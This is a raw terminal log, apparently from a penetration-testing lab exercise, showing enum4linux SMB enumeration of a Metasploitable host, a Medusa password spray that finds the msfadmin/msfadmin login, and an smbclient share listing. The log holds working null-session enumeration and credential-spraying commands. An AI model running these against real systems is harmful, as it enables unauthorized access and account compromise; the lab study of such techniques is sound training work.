//192.168.57.3/IPC$     Mapping: N/A Listing: N/A Writing: N/A
//192.168.57.3/ADMIN$   Mapping: DENIED Listing: N/A Writing: N/A

 ============================( Password Policy Information for 192.168.57.3 )============================
                                                                                                                                                                     
                                                                                                                                                                     

[+] Attaching to 192.168.57.3 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] METASPLOITABLE
        [+] Builtin

[+] Password Info for Domain: METASPLOITABLE

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: Not Set
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: Not Set



[+] Retieved partial password policy with rpcclient:                                                                                                                 
                                                                                                                                                                     
                                                                                                                                                                     
Password Complexity: Disabled                                                                                                                                        
Minimum Password Length: 0


 =======================================( Groups on 192.168.57.3 )=======================================
                                                                                                                                                                     
                                                                                                                                                                     
[+] Getting builtin groups:                                                                                                                                          
                                                                                                                                                                     
                                                                                                                                                                     
[+]  Getting builtin group memberships:                                                                                                                              
                                                                                                                                                                     
                                                                                                                                                                     
[+]  Getting local groups:                                                                                                                                           
                                                                                                                                                                     
                                                                                                                                                                     
[+]  Getting local group memberships:                                                                                                                                
                                                                                                                                                                     
                                                                                                                                                                     
[+]  Getting domain groups:                                                                                                                                          
                                                                                                                                                                     
                                                                                                                                                                     
[+]  Getting domain group memberships:                                                                                                                               
                                                                                                                                                                     
                                                                                                                                                                     
 ==================( Users on 192.168.57.3 via RID cycling (RIDS: 500-550,1000-1050) )==================
                                                                                                                                                                     
                                                                                                                                                                     
[I] Found new SID:                                                                                                                                                   
S-1-5-21-1042354039-2475377354-766472396                                                                                                                             

[+] Enumerating users using SID S-1-5-21-1042354039-2475377354-766472396 and logon username '', password ''                                                          
                                                                                                                                                                     
S-1-5-21-1042354039-2475377354-766472396-500 METASPLOITABLE\Administrator (Local User)                                                                               
S-1-5-21-1042354039-2475377354-766472396-501 METASPLOITABLE\nobody (Local User)
S-1-5-21-1042354039-2475377354-766472396-512 METASPLOITABLE\Domain Admins (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-513 METASPLOITABLE\Domain Users (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-514 METASPLOITABLE\Domain Guests (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1000 METASPLOITABLE\root (Local User)
S-1-5-21-1042354039-2475377354-766472396-1001 METASPLOITABLE\root (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1002 METASPLOITABLE\daemon (Local User)
S-1-5-21-1042354039-2475377354-766472396-1003 METASPLOITABLE\daemon (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1004 METASPLOITABLE\bin (Local User)
S-1-5-21-1042354039-2475377354-766472396-1005 METASPLOITABLE\bin (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1006 METASPLOITABLE\sys (Local User)
S-1-5-21-1042354039-2475377354-766472396-1007 METASPLOITABLE\sys (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1008 METASPLOITABLE\sync (Local User)
S-1-5-21-1042354039-2475377354-766472396-1009 METASPLOITABLE\adm (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1010 METASPLOITABLE\games (Local User)
S-1-5-21-1042354039-2475377354-766472396-1011 METASPLOITABLE\tty (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1012 METASPLOITABLE\man (Local User)
S-1-5-21-1042354039-2475377354-766472396-1013 METASPLOITABLE\disk (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1014 METASPLOITABLE\lp (Local User)
S-1-5-21-1042354039-2475377354-766472396-1015 METASPLOITABLE\lp (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1016 METASPLOITABLE\mail (Local User)
S-1-5-21-1042354039-2475377354-766472396-1017 METASPLOITABLE\mail (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1018 METASPLOITABLE\news (Local User)
S-1-5-21-1042354039-2475377354-766472396-1019 METASPLOITABLE\news (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1020 METASPLOITABLE\uucp (Local User)
S-1-5-21-1042354039-2475377354-766472396-1021 METASPLOITABLE\uucp (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1025 METASPLOITABLE\man (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1026 METASPLOITABLE\proxy (Local User)
S-1-5-21-1042354039-2475377354-766472396-1027 METASPLOITABLE\proxy (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1031 METASPLOITABLE\kmem (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1041 METASPLOITABLE\dialout (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1043 METASPLOITABLE\fax (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1045 METASPLOITABLE\voice (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1049 METASPLOITABLE\cdrom (Domain Group)

 ===============================( Getting printer info for 192.168.57.3 )===============================
                                                                                                                                                                     
No printers returned.                                                                                                                                                


enum4linux complete on Wed Oct 29 13:05:35 2025

                                                                                                                                                                     
┌──(root㉿kali)-[/home/kali]
└─# echo -e "user\nmsfadmin\nservice">smb_user.txt         
                                                                                                                                                                     
┌──(root㉿kali)-[/home/kali]
└─# echo -e "n123456\nmsfadmin\nqwerty\password\nWelcome123" > senhas_spray.txt
                                                                                                                                                                     
┌──(root㉿kali)-[/home/kali]
└─# medusa -h 192.168.57.3 -U smb_user.txt -P senhas_spray.txt -M smbnt -t 50
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

2025-10-29 13:15:27 ACCOUNT CHECK: [smbnt] Host: 192.168.57.3 (1 of 1, 0 complete) User: service (3 of 3, 2 complete) Password: qwerty\password (1 of 4 complete)
2025-10-29 13:15:27 ACCOUNT CHECK: [smbnt] Host: 192.168.57.3 (1 of 1, 0 complete) User: service (3 of 3, 3 complete) Password: msfadmin (2 of 4 complete)
2025-10-29 13:15:27 ACCOUNT CHECK: [smbnt] Host: 192.168.57.3 (1 of 1, 0 complete) User: service (3 of 3, 3 complete) Password: Welcome123 (3 of 4 complete)
2025-10-29 13:15:28 ACCOUNT CHECK: [smbnt] Host: 192.168.57.3 (1 of 1, 0 complete) User: service (3 of 3, 3 complete) Password: n123456 (4 of 4 complete)
2025-10-29 13:15:29 ACCOUNT CHECK: [smbnt] Host: 192.168.57.3 (1 of 1, 0 complete) User: msfadmin (2 of 3, 3 complete) Password: Welcome123 (1 of 4 complete)
2025-10-29 13:15:29 ACCOUNT CHECK: [smbnt] Host: 192.168.57.3 (1 of 1, 0 complete) User: user (1 of 3, 3 complete) Password: n123456 (1 of 4 complete)
2025-10-29 13:15:29 ACCOUNT CHECK: [smbnt] Host: 192.168.57.3 (1 of 1, 0 complete) User: msfadmin (2 of 3, 3 complete) Password: msfadmin (2 of 4 complete)
2025-10-29 13:15:29 ACCOUNT FOUND: [smbnt] Host: 192.168.57.3 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
2025-10-29 13:15:29 ACCOUNT CHECK: [smbnt] Host: 192.168.57.3 (1 of 1, 0 complete) User: msfadmin (2 of 3, 4 complete) Password: qwerty\password (3 of 4 complete)
2025-10-29 13:15:29 ACCOUNT CHECK: [smbnt] Host: 192.168.57.3 (1 of 1, 0 complete) User: msfadmin (2 of 3, 4 complete) Password: n123456 (4 of 4 complete)
2025-10-29 13:15:29 ACCOUNT CHECK: [smbnt] Host: 192.168.57.3 (1 of 1, 0 complete) User: user (1 of 3, 4 complete) Password: Welcome123 (2 of 4 complete)
2025-10-29 13:15:29 ACCOUNT CHECK: [smbnt] Host: 192.168.57.3 (1 of 1, 0 complete) User: user (1 of 3, 4 complete) Password: qwerty\password (3 of 4 complete)
2025-10-29 13:15:29 ACCOUNT CHECK: [smbnt] Host: 192.168.57.3 (1 of 1, 0 complete) User: user (1 of 3, 4 complete) Password: msfadmin (4 of 4 complete)
                                                                                                                                                                     
┌──(root㉿kali)-[/home/kali]
└─# smbclient -L //192.168.57.3 -U msfadmin
Password for [WORKGROUP\msfadmin]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk      
        IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
        msfadmin        Disk      Home Directories
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            METASPLOITABLE
                                                                                                                                                                     
┌──(root㉿kali)-[/home/kali]
└─# exit                                                                       

Script done on 2025-10-29 13:23:47-04:00 [COMMAND_EXIT_CODE="0"]
